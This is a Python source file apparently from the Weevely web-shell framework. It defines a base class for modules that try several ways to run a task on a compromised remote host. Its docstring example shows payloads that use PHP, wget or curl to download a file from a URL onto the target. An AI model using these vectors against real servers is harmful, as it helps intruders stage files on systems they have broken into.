from core.moduleguessbase import ModuleGuessBase
from core.moduleexception import ModuleException, ProbeException, ExecutionException, ProbeSucceed

class ModuleGuess(ModuleGuessBase):
    '''Generic ModuleGuess class to inherit.

    ModuleGuess object is a dynamically loaded Weevely extension that automatically guess best
    way to accomplish tasks on remote target. Vector objects contains the code to run on remote target.
    
    To create a new module, define an object that inherit ModuleGuess (e.g. 'class MyModule(ModuleGuess)')
    into python file situated in 'modules/mygroup/mymodule.py'. Class needs the same name of the
    python file, with first capital letter.
    
    At first run (e.g. running ':mymgroup.mymodule' from terminal for the first time), module 
    constructor executes following main tasks:
        
        A) Defines module arguments (method _set_args(), inherition is recommended) 
        B) Defines module vectors (method _set_vectors(), inherition is recommended)
    
    At every call (e.g. at every ':mymgroup.mymodule' run) run() method parse passed
    arguments and execute following main tasks:
    
        1) Optionally prepares the environment (method _prepare(), inherition is optional)
        2) Runs every vector to guess best way to accomplish task. Guessing stops as soon as 
           first vector returns good results. Those three methods are executed for every vector:
           
           2.1) Formats the passed arguments to simplify current_vector run 
                (method _prepare_vector(), inherition is recommended)
           2.2) Runs current_vector and saves results  (method _execute_vector(), inherition is optional)
           2.3) Verifies probe execution (method  _verify_vector_execution(), inherition is optional)
        
        3) Optionally verifies probe execution (method _verify(), inherition is optional)

    Example of a basic module that download files from web into target:

    ==================================== webdownload.py ===================================

    from core.moduleguess import ModuleGuess
    from core.moduleexception import ProbeException, ProbeSucceed
    
    WARN_DOWNLOAD_OK = 'Downloaded succeed'
    
    class Webdownload(ModuleGuess):

        def _set_args(self):
        
            # Declare accepted module parameters. Let the user choose specific vector to skip guessing with
            # '-vector' parameter. Parameters passed at run are stored in self.args dictionary.
            
            self.argparser.add_argument('url')
            self.argparser.add_argument('rpath')
            self.argparser.add_argument('-vector', choices = self.vectors.keys())
            
    
        def _set_vectors(self):
            
            # Declare vectors to execute. 
            
            # Vectors defined in self.vectors are three diffent ways to accomplish tasks. 
            # They are execute in succession: the first vector that returns a positive 
            # results, break the probe. 
            
            # Vector defined in self.support_vectors are a support vectors executed manually.
            
            # Payload variable fields '$path' and '$url' are replaced at vector execution.
            # Because variable fields '$path' and '$url' corresponds with arguments,
            # is not necessary to inherit _prepare_vector() and _execute_vector().
            
            self.vectors.add_vector(name='putcontent', interpreter='shell.php', payloads = [ 'file_put_contents("$rpath", file_get_contents("$url"));' ])
            self.vectors.add_vector(name='wget', interpreter='shell.sh', payloads = [ 'wget $url -O $rpath' ])
            self.vectors.add_vector(name='curl', interpreter='shell.sh', payloads = [ 'curl -o $rpath $url' ])
            
            self.support_vectors.add_vector(name='check_download', interpreter='file.check', payloads = [ '$rpath', 'exists' ])

        def  _verify_vector_execution(self):
       
           # Verify downloaded file. Save vector return value in self._result and eventually raise 
           # ProbeSucceed to stop module execution and print error message. If not even one vector
           # raise a ProbeSucceed/ProbeException to break the flow, the probe ends with an error
           # due to negative value of self._result.
    
           self._result = self.support_vectors.get('check_download').execute({ 'rpath' : self.args['rpath'] })
           
           if self._result == True:
               raise ProbeSucceed(self.name, WARN_DOWNLOAD_OK)
        
    =============================================================================
                
    '''

    def _set_vectors(self):
        """Inherit this method to add vectors in self.vectors and self.support_vectors lists, easily
        callable in _probe() function. This method is called by module constructor. 
        Example of vector declaration:
        
        > self.support_vectors.add_vector(name='vector_name', interpreter='module_name', payloads = [ 'module_param1', '$module_param2', .. ])
        
        Template fields like '$rpath' are replaced at vector execution.
        
        """
        
        pass
    
    def _set_args(self):
        """Inherit this method to set self.argparser arguments. Set new arguments following
        official python argparse documentation like. This method is called by module constructor.
        Arguments passed at module runs are stored in Module.args dictionary.
        """
        
        pass

    def _init_module(self):
        """Inherit this method to set eventual additional variables. Called by module constructor.
        """
    
    def _prepare(self):
        """Inherit this method to prepare environment for the probe.
        
        This method is called at every module run. Throws ModuleException, ProbeException.
        """
        
        pass        

    def _prepare_vector(self):
        """Inherit this method to prepare properly self.formatted_arguments for the
        self.current_vector execution. 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        self.formatted_args = self.args
        
    def _execute_vector(self):
        """This method execute self.current_vector. Is recommended to avoid inherition
        to prepare properly arguments with self.formatted_args in ModuleGuess._prepare_vector(). 
        
        Vector execution results should be stored in self._result. 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        self._result = self.current_vector.execute(self.formatted_args)
    
    def _verify_vector_execution(self):
        """This method verify vector execution results. Is recommended to
        does not inherit this method but just fill properly self._result in 
        ModuleGuess._execute_vector(). 
        
        This method is called for every vector. Throws ProbeException to break module 
        run with an error, ProbeSucceed to break module run in case of success, and 
        ExecutionException to skip single self.current_vector execution.
        """
        
        # If self._result is set. False is probably a good return value.
        if self._result or self._result == False:
            raise ProbeSucceed(self.name,'Command succeeded')
     
    def _verify(self):
        """Inherit this method to check probe result.
        
        Results to print and return after moudule execution should be stored in self._result.
        It is called at every module run. Throws ModuleException, ProbeException, ProbeSucceed.         
        """
        pass    